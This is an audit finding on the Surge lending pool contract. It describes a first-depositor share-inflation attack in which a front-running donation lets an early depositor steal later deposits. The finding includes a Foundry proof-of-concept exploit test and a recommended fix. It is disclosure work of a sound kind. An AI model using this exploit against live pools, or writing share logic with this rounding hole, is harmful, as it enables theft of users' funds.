0xc0ffEE

high

# An early malicious depositor can manipulate issuance of shares to steal users deposited loan token

## Summary
This is a well-known attack vector, same as finding TOB-YEARN-003 from [here](https://github.com/yearn/yearn-security/blob/master/audits/20210719_ToB_yearn_vaultsv2/ToB_-_Yearn_Vault_v_2_Smart_Contracts_Audit_Report.pdf)
## Vulnerability Detail
Division rounding causes issuance of shares wrong which makes depositors receive less share than expected

Consider exploit path:
1. After pool deployed, Alice deposits 2 wei loan token and receives 2 shares
2. Later, Bob deposits `x` loan tokens
3. Alice knows Bob's transaction and front-runs Bob by transferring `x-1` loan tokens to Pool contract
4. Bob receives 1 shares token
5. Alice withdraw all her shares to receive ~ 2/3 pool loan token
 
 
 POC
 ```solidity
 function testExploit() external {
        address userA = vm.addr(12315125);
        vm.startPrank(userA);
        uint256 amount = 1e36;
        MockERC20 collateralToken = new MockERC20(0, 18);
        MockERC20 loanToken = new MockERC20(amount, 18);
        vm.label(address(collateralToken), "Coll Token");
        Pool pool = factory.deploySurgePool(
            IERC20(address(collateralToken)),
            IERC20(address(loanToken)),
            1e18,
            0.8e18,
            1e15,
            1e15,
            0.1e18,
            0.4e18,
            0.6e18
        );

        address userB = address(1235);
        loanToken.transfer(userB, 1e6);
        uint256 balBefore = loanToken.balanceOf(userA);
        loanToken.approve(address(pool), amount);
        pool.deposit(2);

        loanToken.transfer(address(pool), 99);
        
        changePrank(userB);
        loanToken.approve(address(pool), amount);
        pool.deposit(100);

        changePrank(userA);
        pool.withdraw(type(uint256).max);
        uint256 balAfter = loanToken.balanceOf(userA);
        assertTrue(balAfter > balBefore);
    }
```
## Impact
Later depositors loan tokens could be stolen
## Code Snippet
https://github.com/sherlock-audit/2023-02-surge/blob/main/surge-protocol-v1/src/Pool.sol#L324
https://github.com/sherlock-audit/2023-02-surge/blob/main/surge-protocol-v1/src/Pool.sol#L199-L204
## Tool used
Manual Review, Foundry

## Recommendation
When totalSupply() == 0, issue a minimum number of pool tokens to zero address to enable share dilution